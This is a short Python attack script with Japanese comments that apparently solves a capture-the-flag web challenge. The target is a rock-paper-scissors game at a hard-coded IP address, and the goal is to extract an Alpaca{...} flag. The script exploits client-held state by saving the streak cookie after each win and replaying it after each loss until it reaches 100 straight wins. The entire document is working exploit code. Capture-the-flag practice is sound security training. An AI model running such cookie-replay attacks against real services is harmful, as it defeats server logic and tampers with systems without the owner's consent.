import requests
import re

TARGET_URL = "http://34.170.146.252:31548/"

def solve():
    # 常に保持しておく「セーブデータ」
    saved_cookies = {}
    current_streak = 0
    
    print("攻撃を開始します...")
    
    while current_streak < 100:
        # 1. 保存したCookie（セーブデータ）を使って勝負を挑む
        # ※allow_redirects=False にして、リダイレクト先の処理を自分で制御します
        res = requests.post(
            f"{TARGET_URL}/rpsls",
            data={"input": "rock"}, # 出す手は毎回同じでOK（相手はランダムなので）
            cookies=saved_cookies,
            allow_redirects=False
        )
        
        # 2. サーバーから返ってきた新しいCookieを仮取得
        temp_cookies = saved_cookies.copy()
        if "streak" in res.cookies:
            temp_cookies["streak"] = res.cookies["streak"]
            
        # 3. 新しいCookieを使ってトップページにアクセスし、連勝数を確認
        check_res = requests.get(TARGET_URL, cookies=temp_cookies)
        
        # HTMLから現在の連勝数を抽出
        match = re.search(r"Current streak: (\d+)", check_res.text)
        if match:
            new_streak = int(match.group(1))
            
            if new_streak > current_streak:
                # 【勝ち】連勝が伸びた！セーブデータを上書きする
                current_streak = new_streak
                saved_cookies = temp_cookies
                print(f"勝ち！ 現在の連勝数: {current_streak}")
                
                # 100連勝に到達したらフラグを抽出して終了
                if current_streak >= 100:
                    print("\n=== 100連勝達成！ ===")
                    # フラグの形式 Alpaca{...} を探す
                    flag_match = re.search(r"Alpaca\{.*?\}", check_res.text)
                    if flag_match:
                        print(f"FLAG: {flag_match.group(0)}")
                    else:
                        print("HTMLのレスポンス:\n", check_res.text)
                    break
            else:
                # 【負け or 引き分け】
                # temp_cookiesは破棄し、saved_cookies（直前のセーブデータ）のままループの先頭に戻る
                # print(f"負け/引き分け (リトライ中...) 現在の連勝数: {current_streak}")
                pass

if __name__ == "__main__":
    solve()